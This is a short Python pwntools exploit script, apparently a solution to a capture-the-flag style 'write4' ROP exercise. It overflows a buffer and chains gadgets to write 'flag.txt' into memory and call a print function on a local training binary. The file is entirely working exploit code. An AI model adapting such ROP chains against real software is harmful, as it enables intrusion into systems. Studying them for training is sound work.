from pwn import *
from pwn import p64
import socket
from ctypes import *
context(arch='amd64', os='linux', log_level='DEBUG')

# host = "node.yuzhian.com.cn"
# ip = socket.gethostbyname(host)
# r = remote(ip,37506)#远程连接
# elf = cdll.LoadLibrary('./libwrite432.so')
r = process("./write4")


flag_print_addr = 0x400510

data_addr = 0x0601028
mov_r14_r15 = 0x00400628
pop_r14_r15 = 0x0400690
pop_rdi = 0x0400693
ret = 0x004004e6


payload = b'A'*0x20 + b'junkjunk'
payload += p64(pop_r14_r15) + p64(data_addr) + b"flag.txt" + p64(mov_r14_r15)
payload += p64(pop_rdi) + p64(data_addr) + p64(ret) + p64(flag_print_addr)

pause()

r.sendlineafter(b">", payload)

r.interactive()
